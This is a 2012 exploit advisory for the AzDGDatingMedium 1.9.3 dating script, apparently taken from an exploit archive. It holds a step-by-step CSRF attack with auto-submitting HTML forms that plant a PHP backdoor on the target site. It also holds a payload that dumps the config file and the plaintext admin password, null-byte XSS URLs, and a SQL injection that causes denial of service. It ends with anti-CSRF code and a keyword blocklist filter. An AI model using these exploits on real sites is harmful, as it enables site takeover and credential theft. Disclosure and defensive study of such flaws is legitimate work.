@@ -1,0 +1,421 @@
+id: 18373
+date: 05/27/2012
+title: AzDGDatingMedium 1.9.3 XSS / CSRF / SQL Injection / Directory Traversal
+author: AkaStep
+cves: 
+
+=================================================
+Vulnerable Software: AzDGDatingMedium   Version 1.9.3
+Official Site: http://www.azdg.com/
+=================================================
+=================================================
+Tested:
+*php.ini MAGIC_QUOTES_GPC OFF*
+Safe mode off
+/*
+OS: Windows XP SP2 (32 bit)
+Apache: 2.2.21.0
+PHP Version: 5.2.17.17
+MYSQL:  5.5.24
+*/
+=================================================
+Vuln Desc:
+AzDGDatingMedium  Version 1.9.3
+is prone to XSS,CSRF,PHP Code Injection,Directory Traversal,Sql injection vulns.
+In fact all this vulns exists in administration section and this a bit mitigates issuses but in other side
+using CSRF vuln this is possible to overwrite and silently inject PHP code (Create backdoor)
+So this creates risky situation again.
+
+AzDGDatingMedium    Version 1.9.3 CSRF WHICH ALLOWS TO CREATE BACKDOOR ON TARGET SITE.
+@Print screen after successfull CSRF attack.
+http://s009.radikal.ru/i309/1205/d8/9fa47dd133ce.png
+Vulnerable code section:(XSS+CSRF+traversal)
+=========================SNIP====================
+<? if(C_TEMP_EDIT != '') {
+  function clr()
+  {
+    global $color;
+    $color = ($color == COLOR4) ? COLOR3 : COLOR4;
+    return $color;
+  }
+  $color=0;
+  function dir_tree($df,$level=0)
+  {
+    global $color,$self,$x;
+
+    $df=str_replace("//","/",$df);
+    $dirs=$files=$backup=array();
+    if ($dir=opendir($df)) {
+      while (($file=readdir($dir))!==false) {
+        if ($file=="." || $file=="..") continue;
+        if (is_dir("$df/$file"))  {
+          $dirs[]=$file;
+        }
+        elseif(substr($file,-4) == '.php' || substr($file,-4) == '.txt') {
+          $files[]=$file;
+          $backup[] = (is_file($df.'/'.$file.'.bak')) ?  True : False;
+        }
+      }
+    }
+    closedir($dir);
+
+========================EOF SNIP===================
+
+Howto:
+1) Upload all this stuff to your own host.
+2) Edit appropriate sections of csrfazdg.html
+A) Copy/paste your PHP backdoor to textarea section.
+B) Change form action url to victim.(we need to make POST request there in silent manner)
+3) Pm to admin url to yours malicious main.html
+4) After successfull attack you will find your backdoor here:
+http://victim.tld/languages/zh/zho.php
+NOTE: Before attack make sure that file exists.
+
+Q) Why all this happens?
+A) Theris no ANTI CSRF tokens anymore.
+
+In fact same this vuln in this script can be used to do alot of nasty things.
+In ex: File overwrite(Because it is also prone to traversal vuln)
+In ex:
+http://192.168.0.15/learn/azdgscr/AzDGDatingMedium/admin/index.php?do=tedit&c_temp_edit=default&dir=../include/&f=config.inc.php
+
+Just one example: you can add custom handler to .htaccess which will allow to execute your .gif backdoor as PHP code on server.
+(Images allowed to upload in this script)
+
+
+
+
+=====================BEGIN main.html========================
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 TRANSITIONAL//EN">
+<html>
+<head>
+<title></title>
+
+<style type="text/css">
+body
+{
+background-color:black;
+color:red;
+}
+img
+{
+position:absolute;
+top:20px;
+}
+
+iframe
+{
+position:absolute;
+top:65px;
+left:67px;
+background-color:black;
+color:black;
+}
+</style>
+</head>
+<body>
+
+<img src="http://s019.radikal.ru/i631/1205/b2/d4a3057c9f93.jpg" /><br/>
+
+
+<iframe name="lol" src="csrfazdg.html" align="top" border="0" height="0" width="0" hspace="0" vspace="0"></iframe>
+</body>
+</html>
+
+======================EOF main.html============================
+
+
+=====================BEGIN csrfazdg.html=========================
+
+<!--csrfazdg.html-->
+<body onload="javascript:document.forms[0].submit()">
+
+<form action="http://CHANGE IT TO TARGET SITE/admin/index.php?l=default&do=tedit&action=do&" method=post>
+
+   <input type=hidden name=do value=tedit>
+   <input type=hidden name=c_temp_edit value="sun">
+   <input type=hidden name=do2 value=submit>
+   <input type=hidden name=dir value="../languages/zh">
+   <input type=hidden name=f value="zho.php">
+   <textarea type="hidden" name=text cols=0 rows=0>
+
+<?php YOUR PHP BACKDOOR CODE GOES HERE;?>
+
+</textarea>
+</form>
+
+====================EOF csrfazdg.html============================
+
+
+
+Another note:
+This CMS stores admin password in plaintext+ in include/config.inc.php
+
+
+Use this backdoor payload to steal config:
+
+<?php
+echo '<! --' . PHP_EOL .htmlentities(file_get_contents('../../include/config.inc.php'))
+ . '-->';?>
+
+
+
+After succesfull attack open:
+http://192.168.0.15/learn/azdgscr/AzDGDatingMedium/languages/zh/zho.php
+
+CTRL+U you will see whole config +admin password included.
+You will see something like this: http://s010.radikal.ru/i312/1205/5d/e10c77a25ffd.png
+
+
+
+XSS vulns:
+Same section is also prone to XSS (Cross Site Scripting Vuln)
+A)http://192.168.0.15/learn/azdgscr/AzDGDatingMedium/admin/index.php?do=tedit&c_temp_edit=default&dir=../include/&f=config.inc.php%00<script>alert(1);</script>
+
+B)http://192.168.0.15/learn/azdgscr/AzDGDatingMedium/admin/index.php?do=tedit&c_temp_edit=default%00<script>alert("AkaStep");</script>&dir=../include/&f=config.inc.php
+
+Note: Use null byte.
+
+
+
+SQL injection+CSRF:(In eg: to Create Denial Of Service (DOS) Condition)
+(BTW, it is a bit hard to exploit it and obtain something usefull)
+
+
+============AzDGDatingMedium     Version 1.9.3 CSRF+SQL INJECTION exploit========
+<body onload="javascript:document.forms[0].submit()">
+
+<form action="http://192.168.0.15/learn/azdgscr/AzDGDatingMedium/admin/index.php?do=mess&" method="post">
+<input type="hidden" name="l" value="default">
+<input type="hidden" name="a" value="s">
+<input type="hidden" name="do" value="mess">
+
+<input type="hidden" name="fromid" class="sinput" value="a' union select benchmark(5000000000000,sha1(md5(now()))),2,3,4,5,6,7,8,9-- or ''='">
+
+<input type="hidden" name="toid" class="sinput">
+
+
+<input type="hidden" name="keywords" class="input">
+
+<input type="hidden" name="lastdays" class="sinput">
+
+
+
+</form>
+
+
+Vulnerable Code Section:
+/admin/index.php
+
+
+=============BEGIN SNIP==============
+    case 'mess':
+      if (!isset($a)) $a='';
+      if ($a == "s") {
+        if (!isset($step) || !is_numeric($step)) $step = 50;
+        if (!isset($from) || !is_numeric($from)) $from = 0;
+        if(!isset($fromid) || !is_numeric($fromid)) $id='0';
+        if(!isset($toid) || !is_numeric($toid)) $toid='0';
+        if(!isset($lastdays) || !is_numeric($lastdays)) $lastdays='0';
+        $keywords=cb($keywords);
+        $msortby = " order by id desc";
+
+        // Important /////////////
+        $mid = " id != '0'";
+        $mfromid = (!empty($fromid)) ? " AND fromid = '".$fromid."'" : "";
+        $mtoid = (!empty($toid)) ? " AND toid = '".$toid."'" : "";
+        $mlastdays = (!empty($lastdays)) ? " AND sendtime > DATE_SUB(NOW(), INTERVAL ".$lastdays." DAY)" : "";
+        $mkeywords = (!empty($keywords)) ? " AND (message LIKE '%".SearchByLike($keywords)."%' OR subject LIKE '".SearchByLike($keywords)."')" : "";
+
+        $sql="SELECT * ,".CorrectDate("sendtime")." FROM ".C_MYSQL_MESSAGES." WHERE ".$mid.$mfromid.$mtoid.$mlastdays.$mkeywords.$msortby." limit ".$from.",".$step;
+        $tsql = "SELECT count(*) as total FROM ".C_MYSQL_MESSAGES." WHERE ".$mid.$mfromid.$mtoid.$mlastdays.$mkeywords;
+        $result = mysql_query($sql) or die(mysql_error());
+        $tquery = mysql_query($tsql) or die(mysql_error());
+        $trows = mysql_fetch_array($tquery);
+        $count = $trows['total'];
+        if($count == "0") sprintm($w[110]);
+        $str=$color='';
+        include_once C_PATH.'/templates/'.C_TEMP.'/forum/smiles.php';
+
+        while ($i = mysql_fetch_array($result)) {
+          $color = ($color == COLOR4) ? COLOR3 : COLOR4;
+          $senddate=mysql2data($i['sendtime'], 0, 1);
+
+
+====================EOF SNIP===============
+
+
+Final notes:
+
+@2 developers of this script:
+Sorry Guys i can't get it to work with MYSQL 5.5.24 and i'm a bit lazy to edit all problematic sql queries.
+Thats why i can't pentest it more deeply.
+
+To fix CSRF things realize somethink like this (for $_POST requests)
+Same logic also applies to $_GET requests.
+
+=====================BEGIN(i know it is a bit paranoidal like me:)===================
+<?php
+session_start();
+/**
+Bu sade funksiyamin komekliyi ile CSRF - CROSS SITE REQUEST FORGERY ve yaxud diger adi XSRF tipli vulnerabilitylerin heyata kecmesine
+mane olmus oluruq.
+Indiki web app-larin 99%-i CSRF -e vulnerabledir.
+CSRF -tipli vuln cox tehlukeli Vuln tipidir.Wiki-ye ve OWASP || packetstormsecurity.com-a bax etrafli info ucun.
+Cagirilma metodu:
+
+Her bir POST zapros istifade eden formda hidden input yaradirsan
+<input type="hidden" name="anticsrftokenize" id="anticsrftokenize" value="<?php echo htmlentities($_SESSION['csrftokenize']);?>" />
+
+ve POST zapros invoke edildikde funksiyaya  by reference oturulme edirsen asagidaki kimi.
+
+
+Ve her bir skriptin baslangicinda
+
+prepareanticsrf(); funksiyasini cagirirsan.
+
+POST zapros qebul edildikde yoxlayirsan:
+
+csrfcheck($_POST['anticsrftokenize'],$_SESSION['csrftokenize']);
+
+Tokenler uygun olmadiqda xeberdarliq verirem en esasi ise skriptin isini dayandiriram.
+/AkaStep
+
+**/
+
+
+function csrfcheck(&$val1,&$val2)
+{
+
+if(!isset($_POST['anticsrftokenize']) || !isset($_SESSION['csrftokenize']) ||!isset($_SESSION['oldbasecsrf']) || md5($_POST['anticsrftokenize'])!==md5($_SESSION['oldbasecsrf']))
+{
+    die('<script>alert("\u0050\u006F\u0074\u0065\u006E\u0073\u0069\u0061\u006C\u0020\u0043\u0053\u0052\u0046\u0020\u0041\u0074\u0074\u0061\u0063\u006B\u0021");window.top.location.href = "index.php?attack=CSRF#";</script>' . refreshsess());
+}
+
+
+}
+
+
+
+function refreshsess()
+{
+echo '<META HTTP-EQUIV="Refresh" CONTENT="1;URL=?">';
+}
+
+
+
+
+function prepareanticsrf()
+{
+/* ************************** BEOF ANTI CSRF YOXLANMA UCUN. EL VURMA HECNEYE *******************************************/
+if($_SERVER['REQUEST_METHOD']==='GET') // her bir GET requestde yaradiriq.
+{
+$_SESSION['csrftokenize']=sha1(md5(rand(51389,4895615454).md5(time())));
+
+// # debug echo '<font color="red">' . $_SESSION['csrftokenize'] . '</font>'; kk #
+// # debug echo "<script>alert(\"{$_SESSION['csrftokenize']}\");</script>"; #
+/* sessiyani yaradiriq.  Mehz bunun sayesinde server side yoxlanama edirik CSRF attackdir ya yox?*/
+}
+//# Eger sehifeye POST or HEAD OR TRACE zapros gonderirse bizi firlatmaq ucun amma yemeyib gedir bu defe de. #
+if($_SERVER['REQUEST_METHOD']!=='GET' && !isset($_SESSION['csrftokenize'])) die(refreshsess());
+// Burda header() de vermek olardi amma o halda HEAD requestde infinitive loopa duse bilerdik.
+
+if($_SERVER['REQUEST_METHOD']==='POST' && isset($_SESSION['csrftokenize']))
+//Mehz burada biz POST req-ler ucun CSRF token yaradiriq.CSRF tokenleri daha sensitive edirik.
+{
+$_SESSION['oldbasecsrf']=$_SESSION['csrftokenize'];
+$_SESSION['csrftokenize']=sha1(md5(rand(51389,4895615454).md5(time())));
+}
+
+if(count($_SESSION) !==0) $_SESSION=array_map('htmlentities',$_SESSION); // Her ehtimal ucun sanitizasiya edek.
+
+/* ************************** EOF ANTI CSRF YOXLANMA UCUN EL VURMA HECNEYE *******************************************/
+}
+?>
+=================================EOF==================================================================
+
+
+Workaround about XSS vulns:
+Include it in your config.inc.php (not tested with this CMS)
+
+====================BEGIN================
+<?php
+error_reporting('off');
+
+/*
+ //antikiddie.php
+ include it in your config.inc.php
+ (at bottom after <?php
+ )
+ like this:
+ include 'antikiddie.php';
+
+ ANOTHER NOTE:
+  we can add more tastes here but that may broke
+ application's api.So I removed a lot of tastes from here.
+ */
+
+$commonpatterns=array("$","/*","*","union",'"','\'',
+"0x",
+"where","concat","concat_ws","group_concat",
+"information_schema","tables","columns","where","concat","concat_ws","group_concat",
+"information_schema","tables","columns",'*',
+"hex","table_name","column_name","distinct",
+"/*!","*/","into","load_file",'(',')',
+"outfile","truncate","drop",
+"delete",";","+","substr","update",
+"hex","table_name","column_name",'\x00','\n','\r','\\','\\x1a',
+"schemata","mysql","convert","using","char","$","`","|",
+"\\","(","from",")",'mysql',
+"table","dumpfile","php",
+"distinct",'<','>','<script>','base64','alert','\\','</script>','%0d%0a',
+'document.write',',','String.fromCharCode','..','document.cookie','cookie','eval','href','document.location','location.replace','window',
+'onmouse','onblur','onfocus','onerror','\'','limit','javascript');
+
+
+foreach($commonpatterns as $myvals)
+{
+
+if(stristr(urldecode($_SERVER['QUERY_STRING']),$myvals))
+
+{
+
+
+    die('<script>alert("No Scriptkidding! :)");</script>'. PHP_EOL .
+        '<h1>Can\'t Proceed your request! It is malicious.</h1>');
+}
+}
+unset($myvals);
+?>
+============================END===================================
+
+
+Vendor informed about vulns via e-mail. (Sat, 26 May 2012 02:46:17 +0500)
+
+
+Note: May be other versions affected but not tested.
+
++++++++++As always My Special Thanks to:+++++++
+packetstormsecurity.org
+packetstormsecurity.com
+packetstormsecurity.net
+securityfocus.com
+cxsecurity.com
+security.nnov.ru
+securtiyvulns.com
+securitylab.ru
+1337day.com
+secunia.com &&
+to all AA Team + to all Azerbaijan Black HatZ;)
+++++++++++++++++++++++++++++++++++++++++++++++++
+
+Thank you.
+
+Life is Short :(...Try to Enjoy.
+
+
+/AkaStep ^_^
+
+
+
+#  0day.today [2023-03-21]  #
